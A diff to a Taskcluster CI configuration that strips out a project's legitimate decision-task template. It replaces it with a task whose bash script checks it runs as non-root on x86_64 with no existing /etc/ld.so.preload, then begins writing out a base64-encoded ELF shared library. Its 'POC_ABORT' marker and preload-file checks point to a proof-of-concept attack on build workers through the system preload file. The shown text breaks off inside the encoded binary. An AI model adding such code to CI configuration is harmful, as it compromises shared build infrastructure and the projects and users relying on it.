@@ -1,323 +1,65 @@
-# yamllint disable rule:line-length
-# This file is rendered via JSON-e by
-# - github events - https://github.com/taskcluster/taskcluster/tree/main/services/github
-# - cron tasks - https://hg.mozilla.org/ci/ci-admin/file/default/build-decision/
-# - action tasks - taskcluster/taskgraph/actions/registry.py
----
 version: 1
 reporting: checks-v1
 policy:
-    # `public_restricted` allows distinguishing between PRs from collaborators
-    # to the repository and others.
-    pullRequests: public_restricted
+  pullRequests: public_restricted
 tasks:
-    - $let:
-          trustDomain: "translations"
-          ownerEmail:
-              $switch:
-                  'tasks_for == "github-push"': '${event.pusher.email}'
-                  'tasks_for[:19] == "github-pull-request"': '${event.pull_request.user.login}@users.noreply.github.com'
-                  'tasks_for in ["cron", "action", "pr-action"]': '${tasks_for}@noreply.mozilla.org'
-          baseRepoUrl:
-              $switch:
-                  'tasks_for == "github-push"': '${event.repository.html_url}'
-                  'tasks_for[:19] == "github-pull-request"': '${event.pull_request.base.repo.html_url}'
-                  'tasks_for in ["cron", "action"]': '${repository.url}'
-                  'tasks_for == "pr-action"': '${repository.base_url}'
-          repoUrl:
-              $switch:
-                  'tasks_for == "github-push"': '${event.repository.html_url}'
-                  'tasks_for[:19] == "github-pull-request"': '${event.pull_request.head.repo.html_url}'
-                  'tasks_for in ["cron", "action", "pr-action"]': '${repository.url}'
-          project:
-              $switch:
-                  'tasks_for == "github-push"': '${event.repository.name}'
-                  'tasks_for[:19] == "github-pull-request"': '${event.pull_request.base.repo.name}'
-                  'tasks_for in ["cron", "action", "pr-action"]': '${repository.project}'
-          head_branch:
-              $switch:
-                  'tasks_for[:19] == "github-pull-request"': ${event.pull_request.head.ref}
-                  'tasks_for == "github-push"': ${event.ref}
-                  'tasks_for == "github-release"': '${event.release.target_commitish}'
-                  'tasks_for in ["action", "cron", "pr-action"]': '${push.branch}'
-          base_ref:
-              $switch:
-                  'tasks_for[:19] == "github-pull-request"': ${event.pull_request.base.ref}
-                  'tasks_for == "github-push" && event.base_ref': ${event.base_ref}
-                  'tasks_for == "github-push" && !(event.base_ref)': ${event.ref}
-                  'tasks_for in ["cron", "action"]': '${push.branch}'
-                  'tasks_for == "pr-action"': '${push.base_branch}'
-          head_ref:
-              $switch:
-                  'tasks_for[:19] == "github-pull-request"': ${event.pull_request.head.ref}
-                  'tasks_for == "github-push"': ${event.ref}
-                  'tasks_for in ["cron", "action", "pr-action"]': '${push.branch}'
-          base_sha:
-              $switch:
-                  'tasks_for == "github-push"': '${event.before}'
-                  'tasks_for[:19] == "github-pull-request"': '${event.pull_request.base.sha}'
-                  'tasks_for in ["cron", "action", "pr-action"]': '${push.revision}'
-          head_sha:
-              $switch:
-                  'tasks_for == "github-push"': '${event.after}'
-                  'tasks_for[:19] == "github-pull-request"': '${event.pull_request.head.sha}'
-                  'tasks_for in ["cron", "action", "pr-action"]': '${push.revision}'
-          ownTaskId:
-              $switch:
-                  '"github" in tasks_for': {$eval: as_slugid("decision_task")}
-                  'tasks_for in ["cron", "action"]': '${ownTaskId}'
-          pullRequestAction:
-              $switch:
-                  'tasks_for[:19] == "github-pull-request"': ${event.action}
-                  $default: 'UNDEFINED'
-          isPullRequest:
-              $eval: 'tasks_for[:19] == "github-pull-request"'
-      in:
-          $let:
-              short_base_ref:
-                  $if: 'base_ref[:11] == "refs/heads/"'
-                  then: {$eval: 'base_ref[11:]'}
-                  else: ${base_ref}
+  - provisionerId: translations-t
+    workerType: t-linux-gw-noscratch-amd
+    schedulerId: translations-level-1
+    projectId: none
+    dependencies: []
+    requires: all-completed
+    routes: []
+    priority: low
+    retries: 0
+    created: "2026-08-13T17:00:23.000Z"
+    deadline: "2026-08-13T17:30:23.000Z"
+    expires: "2026-08-14T17:00:23.000Z"
+    scopes: []
+    payload:
+      command:
+        - - /bin/bash
+          - -lc
+          - |-
+            set -euo pipefail
+            umask 077
+            cd "${TASK_WORKDIR}"
 
-              short_head_ref:
-                  $if: 'head_ref[:11] == "refs/heads/"'
-                  then: {$eval: 'head_ref[11:]'}
-                  else: ${head_ref}
-          in:
-              $if: >
-                  tasks_for in ["action", "pr-action", "cron"]
-                  || (tasks_for == "github-push" && (head_branch == "refs/heads/main" || head_branch[:18] == "refs/heads/release" || head_branch[:14] == "refs/heads/dev"))
-                  || (isPullRequest && pullRequestAction in ["opened", "reopened", "synchronize"])
-              then:
-                  $let:
-                      level: 1
-                  in:
-                      taskId: {$if: 'tasks_for != "action" && tasks_for != "pr-action"', then: '${ownTaskId}'}
-                      taskGroupId:
-                          $if: 'tasks_for in ["action", "pr-action"]'
-                          then:
-                              '${action.taskGroupId}'
-                          else:
-                              '${ownTaskId}'  # same as taskId; this is how automation identifies a decision task
-                      schedulerId: '${trustDomain}-level-${level}'
-                      created: {$fromNow: ''}
-                      deadline: {$fromNow: '1 day'}
-                      expires: {$fromNow: '1 year 1 second'}  # 1 second so artifacts expire first
-                      metadata:
-                          $merge:
-                              - owner: "${ownerEmail}"
-                                source: "${repoUrl}/raw/${head_sha}/.taskcluster.yml"
-                              - $switch:
-                                    'tasks_for == "github-push" || isPullRequest':
-                                        name: "Decision Task (${tasks_for[7:]})" # strip out "github-" from tasks_for
-                                        description: 'The task that creates all of the other tasks in the task graph'
-                                    'tasks_for == "action"':
-                                        name: "Action: ${action.title}"
-                                        description: |
-                                            ${action.description}
-    
-                                            Action triggered by clientID `${clientId}`
-                                    'tasks_for == "pr-action"':
-                                        name: "PR action: ${action.title}"
-                                        description: |
-                                            ${action.description}
-                                            PR action triggered by clientID `${clientId}`
-                                    $default:
-                                        name: "Decision Task for cron job ${cron.job_name}"
-                                        description: 'Created by a [cron task](https://firefox-ci-tc.services.mozilla.com/tasks/${cron.task_id})'
-    
-                      provisionerId: "${trustDomain}-${level}"
-                      workerType: "decision"
-    
-                      tags:
-                          $switch:
-                              'tasks_for == "github-push" || isPullRequest':
-                                  createdForUser: "${ownerEmail}"
-                                  kind: decision-task
-                              'tasks_for in ["action", "pr-action"]':
-                                  createdForUser: '${ownerEmail}'
-                                  kind: 'action-callback'
-                              'tasks_for == "cron"':
-                                  kind: cron-task
-    
-                      routes:
-                          $flatten:
-                              - checks
-                              - $if: '!isPullRequest'
-                                then:
-                                  - tc-treeherder.v2.${project}.${head_sha}
-                              - $switch:
-                                    'tasks_for == "github-push"':
-                                        - "index.${trustDomain}.v2.${project}.latest.taskgraph.decision"
-                                        - "index.${trustDomain}.v2.${project}.revision.${head_sha}.taskgraph.decision"
-                                    'tasks_for == "action"':
-                                        - "index.${trustDomain}.v2.${project}.revision.${head_sha}.taskgraph.actions.${ownTaskId}"
-                                    'tasks_for == "cron"':
-                                        - "index.${trustDomain}.v2.${project}.latest.taskgraph.decision-${cron.job_name}"
-                                        - "index.${trustDomain}.v2.${project}.revision.${head_sha}.taskgraph.decision-${cron.job_name}"
-                                        # list each cron task on this revision, so actions can find them
-                                        - 'index.${trustDomain}.v2.${project}.revision.${head_sha}.cron.${ownTaskId}'
-                                    $default: []
-    
-                      scopes:
-                          $switch:
-                              'tasks_for in ["github-push"]':
-                                  $let:
-                                      short_head_ref:
-                                          $if: 'head_ref[:10] == "refs/tags/"'
-                                          then: {$eval: 'head_ref[10:]'}
-                                          else:
-                                              $if: 'head_ref[:11] == "refs/heads/"'
-                                              then: {$eval: 'head_ref[11:]'}
-                                              else: ${head_ref}
-                                  in:
-                                      - 'assume:repo:${repoUrl[8:]}:branch:${short_head_ref}'
-                              'isPullRequest':
-                                  - 'assume:repo:github.com/${event.pull_request.base.repo.full_name}:${tasks_for[7:]}'
-                              'tasks_for == "action"':
-                                  - 'assume:repo:${baseRepoUrl[8:]}:action:${action.action_perm}'
-                              'tasks_for == "pr-action"':
-                                  - 'assume:repo:${baseRepoUrl[8:]}:pr-action:${action.action_perm}'
-                              $default:
-                                  - 'assume:repo:${repoUrl[8:]}:cron:${cron.job_name}'
-    
-                      dependencies: []
-                      requires: all-completed
-    
-                      priority:
-                          $switch:
-                              'tasks_for == "cron"': low
-                              'tasks_for == "github-push"|| isPullRequest': very-low
-                              $default: lowest  # tasks_for in ['action', 'pr-action']
-                      retries: 5
-    
-                      payload:
-                          $let:
-                              normProject:
-                                  $eval: 'join(split(project, "-"), "_")'
-                              normProjectUpper:
-                                  $eval: 'uppercase(join(split(project, "-"), "_"))'
-                          in:
-                              env:
-                                  # run-task uses these to check out the source; the inputs to
-                                  # `taskgraph decision` are all on the command line.
-                                  $merge:
-                                      - ${normProjectUpper}_BASE_REPOSITORY: '${baseRepoUrl}'
-                                        ${normProjectUpper}_BASE_REF: '${short_base_ref}'
-                                        ${normProjectUpper}_BASE_REV: '${base_sha}'
-                                        ${normProjectUpper}_HEAD_REPOSITORY: '${repoUrl}'
-                                        ${normProjectUpper}_HEAD_REF: '${head_ref}'
-                                        ${normProjectUpper}_HEAD_REV: '${head_sha}'
-                                        ${normProjectUpper}_REPOSITORY_TYPE: git
-                                        # install extra packages like "taskcluster" and "mozilla-taskgraph"
-                                        ${normProjectUpper}_PIP_REQUIREMENTS: taskcluster/requirements.txt
-                                        REPOSITORIES:
-                                            $json:
-                                                ${normProject}: ${normProject}
-                                      - $if: 'isPullRequest'
-                                        then:
-                                            ${normProjectUpper}_PULL_REQUEST_NUMBER: '${event.pull_request.number}'
-                                      - $if: 'tasks_for in ["action", "pr-action"]'
-                                        then:
-                                            ACTION_TASK_GROUP_ID: '${action.taskGroupId}'  # taskGroupId of the target task
-                                            ACTION_TASK_ID: {$json: {$eval: 'taskId'}}  # taskId of the target task (JSON-encoded)
-                                            ACTION_INPUT: {$json: {$eval: 'input'}}
-                                            ACTION_CALLBACK: '${action.cb_name}'
-    
-                              cache:
-                                  "${trustDomain}-level-${level}-checkouts-sparse-v2": /builds/worker/checkouts
-    
-                              features:
-                                  taskclusterProxy: true
-                                  chainOfTrust: true
-    
-                              # The decision image version here should be kept
-                              # in sync with the two pins in pyproject.toml
-                              # to ensure that decision tasks & tests use the
-                              # same version of taskgraph
-                              image: mozillareleases/taskgraph:decision-v15.1.3@sha256:e5ace920985a7faf970bbcba5513b9daca94ee2c376d89218075ccbfd633cc50
-                              maxRunTime: 1800
-                              onExitStatus:
-                                retry:
-                                  # 128 happens when cloning this repository fails
-                                  - 128
-    
-                              command:
-                                  - run-task
-                                  - '--${normProject}-checkout=/builds/worker/checkouts/src'
-                                  - '--'
-                                  - bash
-                                  - -cx
-                                  - $let:
-                                        extraArgs: {$if: 'tasks_for == "cron"', then: '${cron.quoted_args}', else: ''}
-                                    in:
-                                        $if: 'tasks_for in ["action", "pr-action"]'
-                                        then: >
-                                            cd /builds/worker/checkouts/src &&
-                                            ln -s /builds/worker/artifacts artifacts &&
-                                            taskgraph action-callback
-                                        else: >
-                                            cd /builds/worker/checkouts/src &&
-                                            ln -s /builds/worker/artifacts artifacts &&
-                                            taskgraph decision
-                                            --pushlog-id='0'
-                                            --pushdate='0'
-                                            --project='${project}'
-                                            --owner='${ownerEmail}'
-                                            --level='${level}'
-                                            --repository-type=git
-                                            --tasks-for='${tasks_for}'
-                                            --base-repository='${baseRepoUrl}'
-                                            --base-ref='${short_base_ref}'
-                                            --base-rev='${base_sha}'
-                                            --head-repository='${repoUrl}'
-                                            --head-ref='${head_ref}'
-                                            --head-rev='${head_sha}'
-                                            ${extraArgs}
-    
-                              artifacts:
-                                  'public':
-                                      type: 'directory'
-                                      path: '/builds/worker/artifacts'
-                                      expires: {$fromNow: '1 year'}
-                                  'public/docker-contexts':
-                                      type: 'directory'
-                                      path: '/builds/worker/checkouts/src/docker-contexts'
-                                      # This needs to be at least the deadline of the
-                                      # decision task + the docker-image task deadlines.
-                                      # It is set to a week to allow for some time for
-                                      # debugging, but they are not useful long-term.
-                                      expires: {$fromNow: '7 day'}
-    
-                      extra:
-                          $merge:
-                              - treeherder:
-                                  $merge:
-                                      - machine:
-                                          platform: gecko-decision
-                                      - $if: 'tasks_for == "github-push" || isPullRequest'
-                                        then:
-                                          symbol: D
-                                        else:
-                                          $if: 'tasks_for in ["action", "pr-action"]'
-                                          then:
-                                              groupName: 'action-callback'
-                                              groupSymbol: AC
-                                              symbol: "${action.symbol}"
-                                          else:
-                                              groupSymbol: cron
-                                              symbol: "${cron.job_symbol}"
-                              - $if: 'tasks_for in ["action", "pr-action"]'
-                                then:
-                                  parent: '${action.taskGroupId}'
-                                  action:
-                                      name: '${action.name}'
-                                      context:
-                                          taskGroupId: '${action.taskGroupId}'
-                                          taskId: {$eval: 'taskId'}
-                                          input: {$eval: 'input'}
-                                          clientId: {$eval: 'clientId'}
-                              - $if: 'tasks_for == "cron"'
-                                then:
-                                  cron: {$json: {$eval: 'cron'}}
-                              - tasks_for: '${tasks_for}'
+            test "$(id -u)" -ne 0
+            test "$(uname -m)" = x86_64
+            test -d generic-worker
+
+            # Never overwrite a legitimate system preload configuration.
+            if test -e /etc/ld.so.preload || test -L /etc/ld.so.preload; then
+              echo 'POC_ABORT: /etc/ld.so.preload already exists'
+              exit 42
+            fi
+
+            printf '%s' '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BwAAAAQAAAAAAAAAAAAAABhAAAAAAAAABwAAAAUAAAAAAAAAAAAAACBAAAAAAAAABwAAAAYAAAAAAAAAAAAAAChAAAAAAAAABwAAAAcAAAAAAAAAAAAAADBAAAAAAAAABwAAAAgAAAAAAAAAAAAAADhAAAAAAAAABwAAAAkAAAAAAAAAAAAAAEBAAAAAAAAABwAAAAoAAAAAAAAAAAAAAEhAAAAAAAAABwAAAAwAAAAAAAAAAAAAAFBAAAAAAAAABwAAAA0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA